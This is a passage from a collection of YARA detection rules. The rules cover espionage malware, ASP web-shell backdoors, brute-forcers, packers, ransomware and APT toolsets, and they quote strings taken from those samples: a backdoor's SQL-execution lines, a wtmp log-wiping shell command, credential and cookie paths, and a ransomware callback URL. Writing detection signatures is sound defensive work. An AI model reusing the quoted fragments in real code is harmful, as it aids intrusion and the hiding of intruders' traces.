        $s1 = "<a href='http://www.baidu.com'>aasd</a>" fullword wide
        $s2 = "Zcg.Test.AspxSpyPlugins" fullword ascii
        $s6 = "TestPlugin" fullword ascii
   
    condition:
        uint16(0) == 0x5a4d and filesize < 10KB and all of them
}

rule Casper_Backdoor_x86
{

    meta:
        description = "Casper French Espionage Malware - Win32/ProxyBot.B - x86 Payload http://goo.gl/VRJNLo"
        author = "Florian Roth"
        reference = "http://goo.gl/VRJNLo"
        date = "2015/03/05"
        hash = "f4c39eddef1c7d99283c7303c1835e99d8e498b0"
        score = 80

    strings:
        $s1 = "\"svchost.exe\"" fullword wide
        $s2 = "firefox.exe" fullword ascii
        $s3 = "\"Host Process for Windows Services\"" fullword wide
        $x1 = "\\Users\\*" fullword ascii
        $x2 = "\\Roaming\\Mozilla\\Firefox\\Profiles\\*" fullword ascii
        $x3 = "\\Mozilla\\Firefox\\Profiles\\*" fullword ascii
        $x4 = "\\Documents and Settings\\*" fullword ascii
        $y1 = "%s; %S=%S" fullword wide
        $y2 = "%s; %s=%s" fullword ascii
        $y3 = "Cookie: %s=%s" fullword ascii
        $y4 = "http://%S:%d" fullword wide
        $z1 = "http://google.com/" fullword ascii
        $z2 = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; MALC)" fullword ascii
        $z3 = "Operating System\"" fullword wide

    condition:
        ( all of ($s*) ) or ( 3 of ($x*) and 2 of ($y*) and 2 of ($z*) )
}

rule Casper_EXE_Dropper
{

    meta:
        description = "Casper French Espionage Malware - Win32/ProxyBot.B - Dropper http://goo.gl/VRJNLo"
        author = "Florian Roth"
        reference = "http://goo.gl/VRJNLo"
        date = "2015/03/05"
        hash = "e4cc35792a48123e71a2c7b6aa904006343a157a"
        score = 80

    strings:
        $s0 = "<Command>" fullword ascii
        $s1 = "</Command>" fullword ascii
        $s2 = "\" /d \"" fullword ascii
        $s4 = "'%s' %s" fullword ascii
        $s5 = "nKERNEL32.DLL" fullword wide
        $s6 = "@ReturnValue" fullword wide
        $s7 = "ID: 0x%x" fullword ascii
        $s8 = "Name: %S" fullword ascii

    condition:
        7 of them
}

rule Casper_SystemInformation_Output
{

    meta:
        description = "Casper French Espionage Malware - System Info Output - http://goo.gl/VRJNLo"
        author = "Florian Roth"
        reference = "http://goo.gl/VRJNLo"
        date = "2015/03/06"
        score = 70

    strings:
        $a0 = "***** SYSTEM INFORMATION ******"
        $a1 = "***** SECURITY INFORMATION ******"
        $a2 = "Antivirus: "
        $a3 = "Firewall: "
        $a4 = "***** EXECUTION CONTEXT ******"
        $a5 = "Identity: "
        $a6 = "<CONFIG TIMESTAMP="

    condition:
        all of them
}

rule suspicious_packer_section : packer PE {

    meta:

        author = "@j0sm1"
        date = "2016/10/21"
        description = "The packer/protector section names/keywords"
        reference = "http://www.hexacorn.com/blog/2012/10/14/random-stats-from-1-2m-samples-pe-section-names/"
        filetype = "binary"

    strings:

        $s1 = ".aspack" wide ascii
        $s2 = ".adata" wide ascii
        $s3 = "ASPack" wide ascii
        $s4 = ".ASPack" wide ascii
        $s5 = ".ccg" wide ascii
        $s6 = "BitArts" wide ascii
        $s7 = "DAStub" wide ascii
        $s8 = "!EPack" wide ascii
        $s9 = "FSG!" wide ascii
        $s10 = "kkrunchy" wide ascii
        $s11 = ".mackt" wide ascii
        $s12 = ".MaskPE" wide ascii
        $s13 = "MEW" wide ascii
        $s14 = ".MPRESS1" wide ascii
        $s15 = ".MPRESS2" wide ascii
        $s16 = ".neolite" wide ascii
        $s17 = ".neolit" wide ascii
        $s18 = ".nsp1" wide ascii
        $s19 = ".nsp2" wide ascii
        $s20 = ".nsp0" wide ascii
        $s21 = "nsp0" wide ascii
        $s22 = "nsp1" wide ascii
        $s23 = "nsp2" wide ascii
        $s24 = ".packed" wide ascii
        $s25 = "pebundle" wide ascii
        $s26 = "PEBundle" wide ascii
        $s27 = "PEC2TO" wide ascii
        $s28 = "PECompact2" wide ascii
        $s29 = "PEC2" wide ascii
        $s30 = "pec1" wide ascii
        $s31 = "pec2" wide ascii
        $s32 = "PEC2MO" wide ascii
        $s33 = "PELOCKnt" wide ascii
        $s34 = ".perplex" wide ascii
        $s35 = "PESHiELD" wide ascii
        $s36 = ".petite" wide ascii
        $s37 = "ProCrypt" wide ascii
        $s38 = ".RLPack" wide ascii
        $s39 = "RCryptor" wide ascii
        $s40 = ".RPCrypt" wide ascii
        $s41 = ".sforce3" wide ascii
        $s42 = ".spack" wide ascii
        $s43 = ".svkp" wide ascii
        $s44 = "Themida" wide ascii
        $s45 = ".Themida" wide ascii
        $s46 = ".packed" wide ascii
        $s47 = ".Upack" wide ascii
        $s48 = ".ByDwing" wide ascii
        $s49 = "UPX0" wide ascii
        $s50 = "UPX1" wide ascii
        $s51 = "UPX2" wide ascii
        $s52 = ".UPX0" wide ascii
        $s53 = ".UPX1" wide ascii
        $s54 = ".UPX2" wide ascii
        $s55 = ".vmp0" wide ascii
        $s56 = ".vmp1" wide ascii
        $s57 = ".vmp2" wide ascii
        $s58 = "VProtect" wide ascii
        $s59 = "WinLicen" wide ascii
        $s60 = "WWPACK" wide ascii
        $s61 = ".yP" wide ascii
        $s62 = ".y0da" wide ascii
        $s63 = "UPX!" wide ascii

    condition:
        // DOS stub signature                           PE signature
        uint16(0) == 0x5a4d and uint32be(uint32(0x3c)) == 0x50450000 and (
            for any of them : ( $ in (0..1024) )
        )
}

rule StealthWasp_s_Basic_PortScanner_v1_2 {
	meta:
		description = "Auto-generated rule on file StealthWasp's Basic PortScanner v1.2.exe"
		author = "yarGen Yara Rule Generator by Florian Roth"
		hash = "7c0f2cab134534cd35964fe4c6a1ff00"
	strings:
		$s1 = "Basic PortScanner"
		$s6 = "Now scanning port:"
	condition:
		all of them
}

rule Chinese_Hacktool_1014 {
	meta:
		description = "Detects a chinese hacktool with unknown use"
		author = "Florian Roth"
		score = 60
		date = "10.10.2014"
		hash = "98c07a62f7f0842bcdbf941170f34990"
	strings:
		$s0 = "IEXT2_IDC_HORZLINEMOVECURSOR" fullword wide
		$s1 = "msctls_progress32" fullword wide
		$s2 = "Reply-To: %s" fullword ascii
		$s3 = "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)" fullword ascii
		$s4 = "html htm htx asp" fullword ascii
	condition:
		all of them
}

rule VUBrute_VUBrute {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file VUBrute.exe"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		hash = "166fa8c5a0ebb216c832ab61bf8872da556576a7"
	strings:
		$s0 = "Text Files (*.txt);;All Files (*)" fullword ascii
		$s1 = "http://ubrute.com" fullword ascii
		$s11 = "IP - %d; Password - %d; Combination - %d" fullword ascii
		$s14 = "error.txt" fullword ascii
	condition:
		all of them
}

rule DK_Brute {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file DK Brute.exe"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		reference = "http://goo.gl/xiIphp"
		hash = "93b7c3a01c41baecfbe42461cb455265f33fbc3d"
	strings:
		$s6 = "get_CrackedCredentials" fullword ascii
		$s13 = "Same port used for two different protocols:" fullword wide
		$s18 = "coded by fLaSh" fullword ascii
		$s19 = "get_grbToolsScaningCracking" fullword ascii
	condition:
		all of them
}

rule VUBrute_config {
	meta:
		description = "PoS Scammer Toolbox - http://goo.gl/xiIphp - file config.ini"
		author = "Florian Roth"
		date = "22.11.14"
		score = 70
		reference = "http://goo.gl/xiIphp"
		hash = "b9f66b9265d2370dab887604921167c11f7d93e9"
	strings:
		$s2 = "Restore=1" fullword ascii
		$s6 = "Thread=" ascii
		$s7 = "Running=1" fullword ascii
		$s8 = "CheckCombination=" fullword ascii
		$s10 = "AutoSave=1.000000" fullword ascii
		$s12 = "TryConnect=" ascii
		$s13 = "Tray=" ascii
	condition:
		all of them
}

rule aspbackdoor_asp4 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp4.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "faf991664fd82a8755feb65334e5130f791baa8c"
	strings:
		$s0 = "system.dll" fullword ascii
		$s2 = "set sys=server.CreateObject (\"system.contral\") " fullword ascii
		$s3 = "Public Function reboot(atype As Variant)" fullword ascii
		$s4 = "t& = ExitWindowsEx(1, atype)" ascii
		$s5 = "atype=request(\"atype\") " fullword ascii
		$s7 = "AceiveX dll" fullword ascii
		$s8 = "Declare Function ExitWindowsEx Lib \"user32\" (ByVal uFlags As Long, ByVal " ascii
		$s10 = "sys.reboot(atype)" fullword ascii
	condition:
		all of them
}

rule ASPack_Chinese {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ASPack Chinese.ini"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "02a9394bc2ec385876c4b4f61d72471ac8251a8e"
	strings:
		$s0 = "= Click here if you want to get your registered copy of ASPack" fullword ascii
		$s1 = ";  For beginning of translate - copy english.ini into the yourlanguage.ini" fullword ascii
		$s2 = "E-Mail:                      shinlan@km169.net" fullword ascii
		$s8 = ";  Please, translate text only after simbol '='" fullword ascii
		$s19 = "= Compress with ASPack" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_EDIR {
	meta:
		description = "Disclosed hacktool set (old stuff) - file EDIR.ASP"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "03367ad891b1580cfc864e8a03850368cbf3e0bb"
	strings:
		$s1 = "response.write \"<a href='index.asp'>" fullword ascii
		$s3 = "if Request.Cookies(\"password\")=\"" ascii
		$s6 = "whichdir=server.mappath(Request(\"path\"))" fullword ascii
		$s7 = "Set fs = CreateObject(\"Scripting.FileSystemObject\")" fullword ascii
		$s19 = "whichdir=Request(\"path\")" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_asp1 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp1.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "9ef9f34392a673c64525fcd56449a9fb1d1f3c50"
	strings:
		$s0 = "param = \"driver={Microsoft Access Driver (*.mdb)}\" " fullword ascii
		$s1 = "conn.Open param & \";dbq=\" & Server.MapPath(\"scjh.mdb\") " fullword ascii
		$s6 = "set rs=conn.execute (sql)%> " fullword ascii
		$s7 = "<%set Conn = Server.CreateObject(\"ADODB.Connection\") " fullword ascii
		$s10 = "<%dim ktdh,scph,scts,jhqtsj,yhxdsj,yxj,rwbh " fullword ascii
		$s15 = "sql=\"select * from scjh\" " fullword ascii
	condition:
		all of them
}

rule ASPack_ASPACK {
	meta:
		description = "Disclosed hacktool set (old stuff) - file ASPACK.EXE"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "c589e6fd48cfca99d6335e720f516e163f6f3f42"
	strings:
		$s0 = "ASPACK.EXE" fullword wide
		$s5 = "CLOSEDFOLDER" fullword wide
		$s10 = "ASPack compressor" fullword wide
	condition:
		all of them
}

rule sig_238_TFTPD32 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file TFTPD32.EXE"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "5c5f8c1a2fa8c26f015e37db7505f7c9e0431fe8"
	strings:
		$s0 = " http://arm.533.net" fullword ascii
		$s1 = "Tftpd32.hlp" fullword ascii
		$s2 = "Timeouts and Ports should be numerical and can not be 0" fullword ascii
		$s3 = "TFTPD32 -- " fullword wide
		$s4 = "%d -- %s" fullword ascii
		$s5 = "TIMEOUT while waiting for Ack block %d. file <%s>" fullword ascii
		$s12 = "TftpPort" fullword ascii
		$s13 = "Ttftpd32BackGround" fullword ascii
		$s17 = "SOFTWARE\\TFTPD32" fullword ascii
	condition:
		all of them
}

rule aspbackdoor_asp3 {
	meta:
		description = "Disclosed hacktool set (old stuff) - file asp3.txt"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e5588665ca6d52259f7d9d0f13de6640c4e6439c"
	strings:
		$s0 = "<form action=\"changepwd.asp\" method=\"post\"> " fullword ascii
		$s1 = "  Set oUser = GetObject(\"WinNT://ComputerName/\" & UserName) " fullword ascii
		$s2 = "    value=\"<%=Request.ServerVariables(\"LOGIN_USER\")%>\"> " fullword ascii
		$s14 = " Windows NT " fullword ascii
		$s16 = " WIndows 2000 " fullword ascii
		$s18 = "OldPwd = Request.Form(\"OldPwd\") " fullword ascii
		$s19 = "NewPwd2 = Request.Form(\"NewPwd2\") " fullword ascii
		$s20 = "NewPwd1 = Request.Form(\"NewPwd1\") " fullword ascii
	condition:
		all of them
}

rule aspbackdoor_entice {
	meta:
		description = "Disclosed hacktool set (old stuff) - file entice.asp"
		author = "Florian Roth"
		date = "23.11.14"
		score = 60
		hash = "e273a1b9ef4a00ae4a5d435c3c9c99ee887cb183"
	strings:
		$s0 = "<Form Name=\"FormPst\" Method=\"Post\" Action=\"entice.asp\">" fullword ascii
		$s2 = "if left(trim(request(\"sqllanguage\")),6)=\"select\" then" fullword ascii
		$s4 = "conndb.Execute(sqllanguage)" fullword ascii
		$s5 = "<!--#include file=sqlconn.asp-->" fullword ascii
		$s6 = "rstsql=\"select * from \"&rstable(\"table_name\")" fullword ascii
	condition:
		all of them
}

rule nAspyUpdate : Family
{
    meta:
        description = "nAspyUpdate"
        author = "Seth Hardy"
        last_modified = "2014-07-14"
        
    condition:
        nAspyUpdateCode or nAspyUpdateStrings
}

rule WoolenGoldfish_Generic_3 
{

    meta:
        description = "Detects a operation Woolen-Goldfish sample - http://goo.gl/NpJpVZ"
        author = "Florian Roth"
        reference = "http://goo.gl/NpJpVZ"
        date = "2015/03/25"
        score = 90
        hash1 = "86222ef166474e53f1eb6d7e6701713834e6fee7"
        hash2 = "e8dbcde49c7f760165ebb0cb3452e4f1c24981f5"
    
    strings:
        $x1 = "... get header FATAL ERROR !!!  %d bytes read > header_size" fullword ascii
        $x2 = "index.php?c=%S&r=%x&u=1&t=%S" fullword wide
        $x3 = "connect_back_tcp_channel#do_connect:: Error resolving connect back hostname" fullword ascii
        $s0 = "kernel32.dll GetProcAddressLoadLibraryAws2_32.dll" fullword ascii
        $s1 = "Content-Type: multipart/form-data; boundary=%S" fullword wide
        $s2 = "Attempting to unlock uninitialized lock!" fullword ascii
        $s4 = "unable to load kernel32.dll" fullword ascii
        $s5 = "index.php?c=%S&r=%x" fullword wide
        $s6 = "%s len:%d " fullword ascii
        $s7 = "Encountered error sending syscall response to client" fullword ascii
        $s9 = "/info.dat" fullword ascii
        $s10 = "Error entering thread lock" fullword ascii
        $s11 = "Error exiting thread lock" fullword ascii
        $s12 = "connect_back_tcp_channel_init:: socket() failed" fullword ascii
   
    condition:
        ( 1 of ($x*) ) or ( 8 of ($s*) )
}

rule apt_ProjectSauron_pipe_backdoor  
{

    meta:
        copyright = "Kaspersky Lab"
        description = "Rule to detect ProjectSauron pipe backdoors"
        version = "1.0"    
        reference = "https://securelist.com/blog/"
   
    strings:
        $a1 = "CreateNamedPipeW" fullword ascii
        $a2 = "SetSecurityDescriptorDacl" fullword ascii
        $a3 = "GetOverlappedResult" fullword ascii
        $a4 = "TerminateThread" fullword ascii
        $a5 = "%s%s%X" fullword wide  

    condition:
        uint16(0) == 0x5A4D  and (all of ($a*)) and filesize < 100000
}

rule apt_ProjectSauron_encrypted_container  
{

    meta:
        copyright = "Kaspersky Lab"
        description = "Rule to detect ProjectSauron samples encrypted container"
        version = "1.0"
        reference = "https://securelist.com/blog/"

    strings:
        $vfs_header = {02 AA 02 C1 02 0?}
        $salt = {91 0A E0 CC 0D FE CE 36 78 48 9B 9C 97 F7 F5 55}

    condition:
        uint16(0) == 0x5A4D and ((@vfs_header < 0x4000) or $salt) and math.entropy(0x400, filesize) >= 6.5 and (filesize > 0x400) and filesize < 10000000 }

rule apt_ProjectSauron_encryption  
{

    meta:
        copyright = "Kaspersky Lab"
        description = "Rule to detect ProjectSauron string encryption"
        version = "1.0"
        reference = "https://securelist.com/blog/"

    strings:
        $a1 = {81??02AA02C175??8B??0685}
        $a2 = {918D9A94CDCC939A93939BD18B9AB8DE9C908DAF8D9B9BBE8C8C9AFF}
        $a3 = {803E225775??807E019F75??807E02BE75??807E0309}

    condition:
        filesize < 5000000 and any of ($a*)
}

rule apt_ProjectSauron_generic_pipe_backdoor 
{

    meta:
        copyright = "Kaspersky Lab"
        description = "Rule to detect ProjectSauron generic pipe backdoors"
        version = "1.0"
        reference = "https://securelist.com/blog/"

    strings:
        $a = { C7 [2-3] 32 32 32 32 E8 }
        $b = { 42 12 67 6B }
        $c = { 25 31 5F 73 }
        $d = "rand"
        $e = "WS2_32"

condition:
    uint16(0) == 0x5A4D and (all of them) and filesize < 400000

}

rule EQGRP_SecondDate_2211 
{

    meta:
        description = "EQGRP Toolset Firewall - file SecondDate-2211.exe"
        author = "Florian Roth"
        reference = "Research"
        date = "2016-08-16"
        hash1 = "2337d0c81474d03a02c404cada699cf1b86c3c248ea808d4045b86305daa2607"

    strings:
        $s1 = "SD_processControlPacket" fullword ascii
        $s2 = "Encryption_rc4SetKey" fullword ascii
        $s3 = ".got_loader" fullword ascii
        $s4 = "^GET.*(?:/ |\\.(?:htm|asp|php)).*\\r\\n" fullword ascii

    condition:
        ( uint16(0) == 0x457f and filesize < 200KB and all of them )
}

rule Codoso_PGV_PVID_1
{

    meta:
        description = "Detects Codoso APT PGV PVID Malware"
        author = "Florian Roth"
        reference = "https://www.proofpoint.com/us/exploring-bergard-old-malware-new-tricks"
        date = "2016-01-30"
        super_rule = 1
        hash1 = "41a936b0d1fd90dffb2f6d0bcaf4ad0536f93ca7591f7b75b0cd1af8804d0824"
        hash2 = "58334eb7fed37e3104d8235d918aa5b7856f33ea52a74cf90a5ef5542a404ac3"
        hash3 = "934b87ddceabb2063b5e5bc4f964628fe0c63b63bb2346b105ece19915384fc7"
        hash4 = "ce91ea20aa2e6af79508dd0a40ab0981f463b4d2714de55e66d228c579578266"
        hash5 = "e770a298ae819bba1c70d0c9a2e02e4680d3cdba22d558d21caaa74e3970adf1"

    strings:
        $x1 = "Cookie: pgv_pvid=" ascii
        $x2 = "DRIVERS\\ipinip.sys" fullword wide
        $s1 = "TsWorkSpaces.dll" fullword ascii
        $s2 = "%SystemRoot%\\System32\\wiaservc.dll" fullword wide
        $s3 = "/selfservice/microsites/search.php?%016I64d" fullword ascii
        $s4 = "/solutions/company-size/smb/index.htm?%016I64d" fullword ascii
        $s5 = "Microsoft Chart ActiveX Control" fullword wide
        $s6 = "MSChartCtrl.ocx" fullword wide
        $s7 = "{%08X-%04X-%04x-%02X%02X-%02X%02X%02X%02X%02X%02X}" fullword ascii
        $s8 = "WUServiceMain" fullword ascii /* Goodware String - occured 2 times */
    condition:
        ( uint16(0) == 0x5a4d and ( 1 of ($x*) or 3 of them ) ) or 5 of them
}

rule Malicious_SFX1 
{

    meta:
        description = "SFX with voicemail content"
        author = "Florian Roth"
        reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950"
        date = "2015-07-20"
        hash = "c0675b84f5960e95962d299d4c41511bbf6f8f5f5585bdacd1ae567e904cb92f"
   
    strings:
        $s0 = "voicemail" ascii /* PEStudio Blacklist: strings */ /* score: '30.00' */
        $s1 = ".exe" ascii
   
    condition:
        uint16(0) == 0x4b50 and filesize < 1000KB and $s0 in (3..80) and $s1 in (3..80) 
}

rule Malicious_SFX2 
{

    meta:
        description = "SFX with adobe.exe content"
        author = "Florian Roth"
        reference = "http://www.kernelmode.info/forum/viewtopic.php?f=16&t=3950"
        date = "2015-07-20"
        hash = "502e42dc99873c52c3ca11dd3df25aad40d2b083069e8c22dd45da887f81d14d"

    strings:
        $s1 = "adobe.exe" fullword ascii /* PEStudio Blacklist: strings */ /* score: '27.00' */
        $s2 = "Extracting files to %s folder$Extracting files to temporary folder" fullword wide /* PEStudio Blacklist: strings */ /* score: '26.00' */
        $s3 = "GETPASSWORD1" fullword wide /* PEStudio Blacklist: strings */ /* score: '23.00' */

    condition:
        uint16(0) == 0x5a4d and filesize < 1000KB and all of them
}

rule legion_777
{
    meta:
        author = "Daxda (https://github.com/Daxda)"
        date = "2016/6/6"
        description = "Detects an UPX-unpacked .777 ransomware binary."
        ref = "https://github.com/Daxda/malware-analysis/tree/master/malware_samples/legion"
        category = "Ransomware"
        sample = "SHA256: 14d22359e76cf63bf17268cad24bac03663c8b2b8028b869f5cec10fe3f75548"

    strings:
        $s1 = "http://tuginsaat.com/wp-content/themes/twentythirteen/stats.php"
        $s2 = "read_this_file.txt" wide // Ransom note filename.
        $s3 = "seven_legion@india.com" // Part of the format string used to rename files.
        $s4 = {46 4f 52 20 44 45 43 52 59 50 54 20 46 49 4c 45 53 0d 0a 53 45 4e 44 20 4f
               4e 45 20 46 49 4c 45 20 49 4e 20 45 2d 4d 41 49 4c 0d 0a 73 65 76 65 6e 5f
               6c 65 67 69 6f 6e 40 69 6e 64 69 61 2e 63 6f 6d } // Ransom note content.
        $s5 = "%s._%02i-%02i-%02i-%02i-%02i-%02i_$%s$.777" // Renaming format string.

    condition:
        4 of ($s*)
}

rule apt_RU_MoonlightMaze_customlokitools {

meta:
	
	author = "Kaspersky Lab"
	date = "2017-03-15"
	version = "1.1"
	last_modified = "2017-03-22"
	reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
	description = "Rule to detect Moonlight Maze Loki samples by custom attacker-authored strings"
	hash = "14cce7e641d308c3a177a8abb5457019"
	hash = "a3164d2bbc45fb1eef5fde7eb8b245ea"
	hash = "dabee9a7ea0ddaf900ef1e3e166ffe8a"
	hash = "1980958afffb6a9d5a6c73fc1e2795c2"
	hash = "e59f92aadb6505f29a9f368ab803082e"

strings:

	$a1="Write file Ok..." ascii wide 
	$a2="ERROR: Can not open socket...." ascii wide
	$a3="Error in parametrs:"  ascii wide
	$a4="Usage: @<get/put> <IP> <PORT> <file>"  ascii wide
	$a5="ERROR: Not connect..."  ascii wide
	$a6="Connect successful...."  ascii wide
	$a7="clnt <%d> rqstd n ll kll"  ascii wide
	$a8="clnt <%d> rqstd swap"  ascii wide
	$a9="cld nt sgnl prcs grp" ascii wide
	$a10="cld nt sgnl prnt" ascii wide

	//keeping only ascii version of string ->
	$a11="ork error" ascii fullword

condition:

	((any of ($a*)))

}

rule apt_RU_MoonlightMaze_customsniffer {

meta:
	
	author = "Kaspersky Lab"
	date = "2017-03-15"
	version = "1.1"
	reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
	description = "Rule to detect Moonlight Maze sniffer tools"
	hash = "7b86f40e861705d59f5206c482e1f2a5"
	hash = "927426b558888ad680829bd34b0ad0e7"
	original_filename = "ora;tdn"
	
strings:


	//strings from ora ->
	$a1="/var/tmp/gogo" fullword
	$a2="myfilename= |%s|" fullword
	$a3="mypid,mygid=" fullword
	$a4="mypid=|%d| mygid=|%d|" fullword

	//strings from tdn ->
	$a5="/var/tmp/task" fullword
	$a6="mydevname= |%s|" fullword

condition:

	((any of ($a*)))

}

rule loki2crypto {

meta:
	
	author = "Costin Raiu, Kaspersky Lab"
	date = "2017-03-21"
	version = "1.0"
	description = "Rule to detect hardcoded DH modulus used in 1996/1997 Loki2 sourcecode; #ifdef STRONG_CRYPTO /* 384-bit strong prime */"
	reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
	hash = "19fbd8cbfb12482e8020a887d6427315"
	hash = "ea06b213d5924de65407e8931b1e4326"
	hash = "14ecd5e6fc8e501037b54ca263896a11"
	hash = "e079ec947d3d4dacb21e993b760a65dc"
	hash = "edf900cebb70c6d1fcab0234062bfc28"

strings:

	$modulus={DA E1 01 CD D8 C9 70 AF C2 E4 F2 7A 41 8B 43 39 52 9B 4B 4D E5 85 F8 49}

condition:

	(any of them)

}

rule apt_RU_MoonlightMaze_de_tool {

meta:
	
	author = "Kaspersky Lab"
	date = "2017-03-27"
	version = "1.0"
	last_modified = "2017-03-27"
	reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
	description = "Rule to detect Moonlight Maze 'de' and 'deg' tunnel tool"
	hash = "4bc7ed168fb78f0dc688ee2be20c9703"
	hash = "8b56e8552a74133da4bc5939b5f74243"

strings:

	$a1="Vnuk: %d" ascii fullword
	$a2="Syn: %d" ascii fullword

	//%s\r%s\r%s\r%s\r ->
	$a3={25 73 0A 25 73 0A 25 73 0A 25 73 0A}

condition:

	((2 of ($a*)))

}

rule apt_RU_MoonlightMaze_cle_tool {

meta:
	
	author = "Kaspersky Lab"
	date = "2017-03-27"
	version = "1.0"
	last_modified = "2017-03-27"
	reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
	description = "Rule to detect Moonlight Maze 'cle' log cleaning tool"
	hash = "647d7b711f7b4434145ea30d0ef207b0"

	
strings:

	$a1="./a filename template_file" ascii wide
	$a2="May be %s is empty?"  ascii wide
	$a3="template string = |%s|"   ascii wide
	$a4="No blocks !!!"
	$a5="No data in this block !!!!!!"  ascii wide
	$a6="No good line"

condition:

	((3 of ($a*)))

}

rule apt_RU_MoonlightMaze_xk_keylogger {

meta:
	
	author = "Kaspersky Lab"
	date = "2017-03-27"
	version = "1.0"
	last_modified = "2017-03-27"
	reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
	description = "Rule to detect Moonlight Maze 'xk' keylogger"

strings:

	$a1="Log ended at => %s"
	$a2="Log started at => %s [pid %d]"
	$a3="/var/tmp/task" fullword
	$a4="/var/tmp/taskhost" fullword
	$a5="my hostname: %s"
	$a6="/var/tmp/tasklog"
	$a7="/var/tmp/.Xtmp01" fullword
	$a8="myfilename=-%s-"
	$a9="/var/tmp/taskpid"
	$a10="mypid=-%d-" fullword
	$a11="/var/tmp/taskgid" fullword
	$a12="mygid=-%d-" fullword


condition:

	((3 of ($a*)))

}

rule apt_RU_MoonlightMaze_encrypted_keylog {

meta:
	
	author = "Kaspersky Lab"
	date = "2017-03-27"
	version = "1.0"
	last_modified = "2017-03-27"
	reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
	description = "Rule to detect Moonlight Maze encrypted keylogger logs"

strings:

	$a1={47 01 22 2A 6D 3E 39 2C}

condition:

	($a1 at 0)

}

rule apt_RU_MoonlightMaze_IRIX_exploit_GEN {

meta:
	
	author = "Kaspersky Lab"
	date = "2017-03-27"
	version = "1.0"
	last_modified = "2017-03-27"
	reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
	description = "Rule to detect Irix exploits from David Hedley used by Moonlight Maze hackers"
	reference2 = "https://www.exploit-db.com/exploits/19274/"
	hash = "008ea82f31f585622353bd47fa1d84be" //df3
	hash = "a26bad2b79075f454c83203fa00ed50c" //log
	hash = "f67fc6e90f05ba13f207c7fdaa8c2cab" //xconsole
	hash = "5937db3896cdd8b0beb3df44e509e136" //xlock
	hash = "f4ed5170dcea7e5ba62537d84392b280" //xterm

strings:

	$a1="stack = 0x%x, targ_addr = 0x%x"
	$a2="execl failed"

condition:

	(uint32(0)==0x464c457f) and (all of them)

}

rule apt_RU_MoonlightMaze_u_logcleaner {

meta:
	
	author = "Kaspersky Lab"
	date = "2017-03-27"
	version = "1.0"
	last_modified = "2017-03-27"
	reference = "https://en.wikipedia.org/wiki/Moonlight_Maze"
	description = "Rule to detect log cleaners based on utclean.c"
	reference2 = "http://cd.textfiles.com/cuteskunk/Unix-Hacking-Exploits/utclean.c"
	hash = "d98796dcda1443a37b124dbdc041fe3b"
	hash = "73a518f0a73ab77033121d4191172820"

strings:

	$a1="Hiding complit...n"
	$a2="usage: %s <username> <fixthings> [hostname]"
	$a3="ls -la %s* ; /bin/cp  ./wtmp.tmp %s; rm  ./wtmp.tmp"

condition:

	(uint32(0)==0x464c457f) and (any of them)

}

rule HKTL_NET_GUID_CasperStager {
    meta:
        description = "Detects c# red/black-team tools via typelibguid"
        reference = "https://github.com/ustayready/CasperStager"
        author = "Arnim Rupp"
        date = "2020-12-28"
    strings:
        $typelibguid0 = "c653a9f2-0939-43c8-9b93-fed5e2e4c7e6" ascii nocase wide
        $typelibguid1 = "48dfc55e-6ae5-4a36-abef-14bc09d7510b" ascii nocase wide
    condition:
        (uint16(0) == 0x5A4D and uint32(uint32(0x3C)) == 0x00004550) and any of them
}

rule MINIASP_APT1
{

    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"
        
    strings:
        $s1 = "miniasp" wide ascii
        $s2 = "wakeup=" wide ascii
        $s3 = "download ok!" wide ascii
        $s4 = "command is null!" wide ascii
        $s5 = "device_input.asp?device_t=" wide ascii

    condition:
        all of them
}

rule EclipseSunCloudRAT
{

    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"
        
    strings:
        $a = "Eclipse_A" wide ascii
        $b = "\\PJTS\\" wide ascii
        $c = "Eclipse_Client_B.pdb" wide ascii
        $d = "XiaoME" wide ascii
        $e = "SunCloud-Code" wide ascii
        $f = "/uc_server/data/forum.asp" wide ascii

    condition:
        any of them
}

rule ccrewMiniasp
{

    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"
        

  strings:
        $a = "MiniAsp.pdb" wide ascii
        $b = "device_t=" wide ascii

  condition:
        any of them
}

rule MiniASP
{

    meta:
        author = "AlienVault Labs"
        info = "CommentCrew-threat-apt1"
        
    strings:
        $KEY = { 71 30 6E 63 39 77 38 65 64 61 6F 69 75 6B 32 6D 7A 72 66 79 33 78 74 31 70 35 6C 73 36 37 67 34 62 76 68 6A }
        $PDB = "MiniAsp.pdb" nocase wide ascii

    condition:
        any of them
}

rule hancitor {
	meta:
		description = "Memory string yara for Hancitor"
		author = "J from THL <j@techhelplist.com>"
		reference1 = "https://researchcenter.paloaltonetworks.com/2018/02/threat-brief-hancitor-actors/"
		reference2 = "https://www.virustotal.com/#/file/43e17f30b78c085e9bda8cadf5063cd5cec9edaa7441594ba1fe51391cc1c486/"
